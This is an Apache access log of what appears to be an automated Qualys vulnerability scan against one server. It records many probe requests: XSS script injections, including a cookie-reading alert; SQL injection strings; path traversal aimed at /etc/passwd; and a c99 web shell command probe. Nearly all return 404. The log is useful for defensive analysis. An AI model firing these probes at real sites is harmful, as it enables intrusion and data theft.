47.150.129.197 - - [02/Apr/2017:09:54:55 +0000] "GET /robots.txt HTTP/1.1" 200 26
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET //zenario/compressor.php?zenario_siteconfigp=&e=php HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /wp-content/plugins/s3-video/views/video-management/preview-video.php?player=flowplayer&base=\"></script><script>alert(12345);</script> HTTP/1.1" 404 356
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /help/index.jsp HTTP/1.1" 404 302
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /eRoomASP/DlgChooseClient.asp HTTP/1.1" 404 316
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /?page=pie-register&show_dash_widget=1&invitaion_code=PHNjcmlwdD5hbGVydChTdHJpbmcuZnJvbUNoYXJDb2RlKDgxLDg1LDY1LDc2LDg5LDgzLDg4LDgzLDgzLDg0LDY5LDgzLDg0KSk8L3NjcmlwdD4= HTTP/1.1" 200 55
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /index.php?owa_do=base.loginForm HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /index.php?option=com_contenthistory&view=history&list[select]=1 HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /qualys_12829.action HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /courier/intermediate_login.html HTTP/1.1" 404 319
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /xmldata?item=All HTTP/1.1" 404 295
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /desktopmodules/dnnarticle/dnnarticlerss.aspx?moduleid=0&categoryid=1+or+1=char(0x41) HTTP/1.1" 404 332
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /xmldata?item=All HTTP/1.1" 404 295
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /console/login/LoginForm.jsp HTTP/1.1" 404 315
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /jamon/mondetail.jsp HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET / HTTP/1.1" 200 55
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /reports/rwservlet/showmap HTTP/1.1" 404 313
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET //index.php?ajaxRequest=1&requestKey=\";></script><script>alert(\"QualysXSSTest\")</script> HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /Upload/search.php HTTP/1.1" 404 305
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /console/login/LoginForm.jsp HTTP/1.1" 404 315
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /VoicePortal/ HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /CMSPages/GetDocLink.ashx?link=http://www.qualys.com HTTP/1.1" 404 312
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /setup/index.php HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /Documentation.html HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /example/Login.action HTTP/1.1" 404 308
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /Documentation.html HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /Documentation.html HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:03:37 +0000] "GET /install/index.php HTTP/1.1" 404 305
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET //doc/html/index.html HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /Documentation.html HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /system/login HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /core/orionSplashScreen.do HTTP/1.1" 404 313
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /server-status?sestest HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET / HTTP/1.1" 200 55
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /vicidial/welcome.php HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /index.vm HTTP/1.1" 404 296
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /about.php HTTP/1.1" 404 287
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /console/login/LoginForm.jsp HTTP/1.1" 404 315
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /struts2-rest-showcase/orders/ HTTP/1.1" 404 317
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /modules/Printing/output.php?url=L2V0Yy9wYXNzd2Q= HTTP/1.1" 404 315
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /symphony/ HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /modules/Printing/output.php?url=YzpcYm9vdC5pbmk= HTTP/1.1" 404 315
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET //config HTTP/1.1" 404 294
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /index.php?mact=Search%2Ccntnt01%2Cdosearch%2C0&cntnt01returnid=15&cntnt01searchinput=\"><script>alert('QualysXSSTest')</script>&cntnt01submit=Submit HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /omc/GetLoginScreen.uevent HTTP/1.1" 404 313
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /console/login/LoginForm.jsp HTTP/1.1" 404 315
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /core/orionSplashScreen.do HTTP/1.1" 404 313
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /typo3conf/ext/ke_dompdf/res/dompdf/www/examples.php HTTP/1.1" 404 339
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /index.php?option=com_payplans&group_id=1'QUALYS-INJECTION-TEST HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /wp-content/plugins/rss-feed-reader/magpie/scripts/magpie_slashbox.php?rss_url=%3Cscript%3Ealert%28%22QualysXSSTest%22%29%3C/script%3E HTTP/1.1" 404 357
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET / HTTP/1.1" 200 55
10.79.217.2 - - [04/Apr/2017:18:03:38 +0000] "GET /parser/parser.php?file=<script>alert(\"VeryLongQualysXSSTestString\")</script> HTTP/1.1" 404 305
10.79.217.2 - - [04/Apr/2017:18:03:39 +0000] "GET /parser/parser.php?file=file=ThisFiLEReaLLyDoesNoTEXiSThereQualys! HTTP/1.1" 404 305
10.79.217.2 - - [04/Apr/2017:18:03:39 +0000] "GET /css/footer.js HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:39 +0000] "GET /index.php?option=com_easy_youtube_gallery&view=videos&mycategory=0'&defaultvideo=9&Itemid=752&lang=en HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:39 +0000] "POST /wp-content/plugins/xml-and-csv-import-in-article-content/upload-process.php HTTP/1.1" 404 353
10.79.217.2 - - [04/Apr/2017:18:03:39 +0000] "GET /wp-content/plugins/abtest/abtest_admin.php?action=../../../../wp-links-opml HTTP/1.1" 404 330
10.79.217.2 - - [04/Apr/2017:18:03:39 +0000] "GET /css/footer.js HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:39 +0000] "GET /example/HelloWorld.action HTTP/1.1" 404 313
10.79.217.2 - - [04/Apr/2017:18:03:39 +0000] "GET /example/HelloWorld.action HTTP/1.1" 404 313
10.79.217.2 - - [04/Apr/2017:18:03:39 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:39 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:39 +0000] "GET //user/login HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:39 +0000] "GET //user/login HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:39 +0000] "GET //user/login HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:39 +0000] "GET //user/login HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:39 +0000] "GET //user/login HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:39 +0000] "GET //user/login HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:39 +0000] "GET //user/login HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:39 +0000] "GET //user/login HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:39 +0000] "GET //user/login HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:40 +0000] "GET //user/login HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:40 +0000] "GET //user/login HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:40 +0000] "GET //user/login HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:40 +0000] "GET //user/login HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:40 +0000] "GET //user/login HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:40 +0000] "GET / HTTP/1.1" 200 55
10.79.217.2 - - [04/Apr/2017:18:03:40 +0000] "GET / HTTP/1.1" 200 55
10.79.217.2 - - [04/Apr/2017:18:03:40 +0000] "POST /2014/users/new HTTP/1.1" 404 292
10.79.217.2 - - [04/Apr/2017:18:03:40 +0000] "GET /courier/web/1000@/wmLogin.html HTTP/1.1" 404 308
10.79.217.2 - - [04/Apr/2017:18:03:40 +0000] "GET / HTTP/1.1" 200 55
10.79.217.2 - - [04/Apr/2017:18:03:40 +0000] "GET /wp-content/plugins/wp-mobile-detector/readme.txt HTTP/1.1" 404 336
10.79.217.2 - - [04/Apr/2017:18:03:40 +0000] "GET /admin-console/login.seam HTTP/1.1" 404 312
10.79.217.2 - - [04/Apr/2017:18:03:40 +0000] "GET // HTTP/1.1" 200 55
10.79.217.2 - - [04/Apr/2017:18:03:44 +0000] "POST /examples/servlet/RequestParamExample HTTP/1.1" 404 324
10.79.217.2 - - [04/Apr/2017:18:03:44 +0000] "GET /jkstatus HTTP/1.1" 404 296
10.79.217.2 - - [04/Apr/2017:18:03:44 +0000] "GET /status HTTP/1.1" 404 294
10.79.217.2 - - [04/Apr/2017:18:03:44 +0000] "GET /Reminder.php?searchtype=esearch&user=aaaa'%20or%20memberName='bbbbb HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:03:44 +0000] "GET /News.php?&board=fake&db_server=10.10.10.10&$db_user=anyuser&db_passwd=anypass&template=http://www.qualys.com HTTP/1.1" 404 296
10.79.217.2 - - [04/Apr/2017:18:03:44 +0000] "GET /hit.php HTTP/1.1" 404 295
10.79.217.2 - - [04/Apr/2017:18:03:44 +0000] "GET /config.inc HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:44 +0000] "GET /?mod=qualyscfyz&op=browse HTTP/1.1" 200 55
10.79.217.2 - - [04/Apr/2017:18:03:44 +0000] "GET /?mod=<script>alert(document.cookie)</script>&op=browse HTTP/1.1" 200 55
10.79.217.2 - - [04/Apr/2017:18:03:44 +0000] "GET /user/admin.txt HTTP/1.1" 404 302
10.79.217.2 - - [04/Apr/2017:18:03:44 +0000] "GET /g6B2zfwh.php?/etc/passwd HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:03:44 +0000] "GET /7PuHWK00.php3?/etc/passwd HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:44 +0000] "GET /Uy6FSF0p.php4?/etc/passwd HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:44 +0000] "GET /bRPWo21W.php HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:03:45 +0000] "GET /0io323sX.php3 HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:45 +0000] "GET /cNgYzbUw.php4 HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:45 +0000] "GET /plugins/file.php?fm_path=/../../../../../../../../etc/passwd HTTP/1.1" 404 304
10.79.217.2 - - [04/Apr/2017:18:03:45 +0000] "GET /logicworks.ini HTTP/1.1" 404 302
10.79.217.2 - - [04/Apr/2017:18:03:45 +0000] "GET /out.php?ID=1234567890 HTTP/1.1" 404 295
10.79.217.2 - - [04/Apr/2017:18:03:45 +0000] "GET /in.php?ID=1234567890 HTTP/1.1" 404 294
10.79.217.2 - - [04/Apr/2017:18:03:45 +0000] "GET /defines.php HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:03:45 +0000] "GET /modules.php?name=AvantGo&file=print&sid=qualys HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:03:45 +0000] "GET /modules.php?name=News&file=print&sid=qualys HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:03:45 +0000] "GET /modules.php?op=modload&name=Members_List&file=index&sortby=pn_uname; HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:03:45 +0000] "GET /modules.php?op=modload&name=Forums&file=attachment&AtchOp=show HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:03:45 +0000] "GET /chitchat.php HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:03:45 +0000] "GET /chitchat_mainpage.php HTTP/1.1" 404 309
10.79.217.2 - - [04/Apr/2017:18:03:45 +0000] "GET /search/?SectionIDOverride=1&SearchText=<script>alert('QualysXSS');</script> HTTP/1.1" 404 295
10.79.217.2 - - [04/Apr/2017:18:03:45 +0000] "GET /default.php?info_message=%3Cscript%3Ealert(666)%3C/script%3E HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:03:45 +0000] "GET /<title>The Exchange Project</title>.*default.php?error_message=%3Cscript%3Ealert(666)%3C/script%3E HTTP/1.1" 404 304
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /admin/index.php HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /calendar.php?year=<script>alert(document.cookie);</script>&month=03&day=05 HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /pafiledb.php?action=rate&id=1[Qualys]&rate=dorate&rating=10 HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /calendar.php?year=<script>alert('PathDisc');</script>&month=03&day=05 HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /FALSE_QUERY/no_such_fileq7w9v.txt HTTP/1.1" 404 321
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /search.php?searchfor=%22%3E%3Cscript%3Ealert('QualysTest')%3C/script%3E HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /WorkArea/login.aspx HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /index.php?option=com_multicalendar&task=editevent&paletteDefault=1\"</script><script>alert('QUALYSXSSTEST');</script> HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /download.php?id=666% HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /index.php?option=com_multicalendar&task=editevent&calid=1\";</script><script>alert('QUALYSXSSTEST');</script> HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /editparams.cgi HTTP/1.1" 404 302
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /Citrix/XenApp/auth/login.aspx?CTX_MessageType=WARNING&CTX_MessageKey=NoUsableClientDetected HTTP/1.1" 404 317
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /search.php?fields=content&q=%3Cscript%3Ealert('QualysTest')%3C/script%3E HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /webc HTTP/1.1" 404 292
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /favicon.iso HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /webc.cgi HTTP/1.1" 404 296
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /client/chat.php?id=1%22%20%3E%3C/script%3E%3Cscript%3Ealert%28%27QualysXSSTest%27%29%3C/script%3E&xhash=1%22%20%3Cscript%3Ealert%28%27QualysXSSTest2%27%29%3C/script%3E HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /webc.exe HTTP/1.1" 404 296
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /client/chat.php?id=1%22%20%3E%3C/script%3E%3Cscript%3Ealert%28%27QualysXSSTestPart2%27%29%3C/script%3E&xhash=1 HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "POST /cgi-bin/cc_guestbook.pl HTTP/1.1" 404 311
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /userui/welcome.php HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /start.php HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /admin/config.php HTTP/1.1" 404 304
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /adminui/welcome.php HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /start.php HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "POST /login HTTP/1.1" 404 283
10.79.217.2 - - [04/Apr/2017:18:03:46 +0000] "GET /superguestconfig HTTP/1.1" 404 304
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "POST /vtigerservice.php?service=outlook HTTP/1.1" 404 305
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /WEB-INF/ HTTP/1.1" 404 296
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "POST /recoveryconsole/bpl/login.php?name=root&rx=8959383&ver=7.3.0&gcv=0&lvl=2 HTTP/1.1" 404 317
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /ikonboard.cgi HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /index.php/admin/ HTTP/1.1" 404 304
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "POST /myaccount/login.asp HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /example/HelloWorld.action HTTP/1.1" 404 313
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET etc/passwd HTTP/1.1" 400 346
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET / HTTP/1.1" 400 309
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /index.php?q=vwrooms/logout&module=<script>alert('qualys123')</script>&message=<script>alert('qualys123')</script> HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /ossim/session/login.php HTTP/1.1" 404 311
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET / HTTP/1.1" 400 319
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /com.vmturbo.UI/UIMain.html HTTP/1.1" 404 314
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /album.pl?function=about HTTP/1.1" 404 296
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /struts-cookbook/ HTTP/1.1" 404 304
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /smileys.php HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /wp-content/plugins/wp-e-commerce/wpsc-merchants/bradesco-gateway/falha.php?1%3CScRiPt%3Eprompt%28%27QualysXSSTest%27%29%3C/ScRiPt%3E HTTP/1.1" 404 362
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /login.php?target=http://qualys/ HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /c99.php HTTP/1.1" 404 295
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /register.php?target=http://qualys/ HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /c99.php HTTP/1.1" 404 295
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /register.php?target=\"/><script>alert(document.domain)</script><input+type=\"hidden HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /c99.php?act=cmd&d=%2Fvar%2Fwww%2Fhtml%2F&cmd=cat+%2Fetc%2Fredhat-release&cmd_txt=1&submit=Execute HTTP/1.1" 404 285
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /normal_html.cgi?file=../../../../../../etc/passwd%00 HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /wp-content/plugins/simple-popup-images/popup.php?z=%22%3E%3Cscript%3Ealert(%27QualysXSSTest%27)%3C/script%3E HTTP/1.1" 404 336
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /normal_html.cgi?file=%3Cscript%3Ealert(%22QualysGS%22)%3C/script%3E%00 HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /robots.txt HTTP/1.1" 200 26
10.79.217.2 - - [04/Apr/2017:18:03:47 +0000] "GET /login.php?target=\"/><script>alert(document.domain)</script><input+type=\"hidden HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:48 +0000] "GET /store/WsError.asp?msg=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E HTTP/1.1" 404 305
10.79.217.2 - - [04/Apr/2017:18:03:48 +0000] "GET /modules.php?name=Downloads&d_op=getit&lid=666%20QualysTest; HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:03:48 +0000] "GET /test/guestbook_entries HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:03:48 +0000] "GET /modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink&cid=2%20QualysTest; HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:03:48 +0000] "GET /javascript/jquery-1.6.2.js HTTP/1.1" 404 314
10.79.217.2 - - [04/Apr/2017:18:03:48 +0000] "GET /modules.php?op=modload&name=Glossary&file=index&page=` HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:03:48 +0000] "GET /index.php/component/acesearch/search?query=%22%3E%3Cscript%3Ealert(%22QualysXSSTest%22);%3C/script%3E HTTP/1.1" 404 324
10.79.217.2 - - [04/Apr/2017:18:03:48 +0000] "GET /wp-content/plugins/wp-restful/html_api_authorize.php?oauth_callback=oauth_callback%27%3E%3Cscript%3Ealert(%22QualysXSSTest%22)%3C/script%3E HTTP/1.1" 404 340
10.79.217.2 - - [04/Apr/2017:18:03:48 +0000] "GET /wp-content/plugins/wp-restful/html_api_login.php?oauth_token_temp=%22%3E%3Cscript%3Ealert(%22QualysXSSTest%22)%3C/script%3E HTTP/1.1" 404 336
10.79.217.2 - - [04/Apr/2017:18:03:48 +0000] "GET /wp-content/plugins/cac-featured-content/timthumb.php?src=QUALYS_URL HTTP/1.1" 404 340
10.79.217.2 - - [04/Apr/2017:18:03:48 +0000] "GET /wp-content/plugins/category-grid-view-gallery/includes/timthumb.php?src=QUALYS_URL HTTP/1.1" 404 355
10.79.217.2 - - [04/Apr/2017:18:03:48 +0000] "GET /wp-content/plugins/auto-attachments/thumb.php?src=QUALYS_URL HTTP/1.1" 404 333
10.79.217.2 - - [04/Apr/2017:18:03:48 +0000] "GET /wp-content/plugins/wp-marketplace/libs/timthumb.php?src=QUALYS_URL HTTP/1.1" 404 339
10.79.217.2 - - [04/Apr/2017:18:03:48 +0000] "GET /wp-content/plugins/dp-thumbnail/timthumb/timthumb.php?src=QUALYS_URL HTTP/1.1" 404 341
10.79.217.2 - - [04/Apr/2017:18:03:48 +0000] "GET /wp-content/plugins/vk-gallery/lib/timthumb.php?src=QUALYS_URL HTTP/1.1" 404 334
10.79.217.2 - - [04/Apr/2017:18:03:48 +0000] "GET /wp-content/plugins/rekt-slideshow/picsize.php?src=QUALYS_URL HTTP/1.1" 404 333
10.79.217.2 - - [04/Apr/2017:18:03:48 +0000] "GET /wp-content/plugins/rent-a-car/libs/timthumb.php?src=QUALYS_URL HTTP/1.1" 404 335
10.79.217.2 - - [04/Apr/2017:18:03:48 +0000] "GET /wp-content/plugins/lisl-last-image-slider/timthumb.php?src=QUALYS_URL HTTP/1.1" 404 342
10.79.217.2 - - [04/Apr/2017:18:03:49 +0000] "GET /node.xml HTTP/1.1" 404 296
10.79.217.2 - - [04/Apr/2017:18:03:49 +0000] "GET /wp-content/plugins/islidex/js/timthumb.php?src=QUALYS_URL HTTP/1.1" 404 330
10.79.217.2 - - [04/Apr/2017:18:03:49 +0000] "GET /user/login HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:49 +0000] "GET /wp-content/plugins/kino-gallery/timthumb.php?src=QUALYS_URL HTTP/1.1" 404 332
10.79.217.2 - - [04/Apr/2017:18:03:49 +0000] "GET /css/footer.js HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:49 +0000] "GET /wp-content/plugins/cms-pack/timthumb.php?src=QUALYS_URL HTTP/1.1" 404 328
10.79.217.2 - - [04/Apr/2017:18:03:49 +0000] "GET /Documentation.html HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:03:49 +0000] "GET /wp-content/plugins/a-gallery/timthumb.php?src=QUALYS_URL HTTP/1.1" 404 329
10.79.217.2 - - [04/Apr/2017:18:03:49 +0000] "GET /general/login.php HTTP/1.1" 404 305
10.79.217.2 - - [04/Apr/2017:18:03:49 +0000] "GET /login HTTP/1.1" 404 293
10.79.217.2 - - [04/Apr/2017:18:03:49 +0000] "GET /wp-content/plugins/category-list-portfolio-page/scripts/timthumb.php?src=QUALYS_URL HTTP/1.1" 404 356
10.79.217.2 - - [04/Apr/2017:18:03:49 +0000] "GET /login HTTP/1.1" 404 293
10.79.217.2 - - [04/Apr/2017:18:03:49 +0000] "GET /wp-content/plugins/really-easy-slider/inc/thumb.php?src=QUALYS_URL HTTP/1.1" 404 339
10.79.217.2 - - [04/Apr/2017:18:03:49 +0000] "GET /Documentation.html HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:03:49 +0000] "GET /wp-content/plugins/verve-meta-boxes/tools/timthumb.php?src=QUALYS_URL HTTP/1.1" 404 342
10.79.217.2 - - [04/Apr/2017:18:03:49 +0000] "GET /Documentation.html HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:03:49 +0000] "GET /wp-content/plugins/user-avatar/user-avatar-pic.php?id=0&allowedSites[]=blogger.com&src=http://blogger.com.QUALYS_URL HTTP/1.1" 404 338
10.79.217.2 - - [04/Apr/2017:18:03:49 +0000] "HEAD /site/image/white.gif HTTP/1.1" 404 -
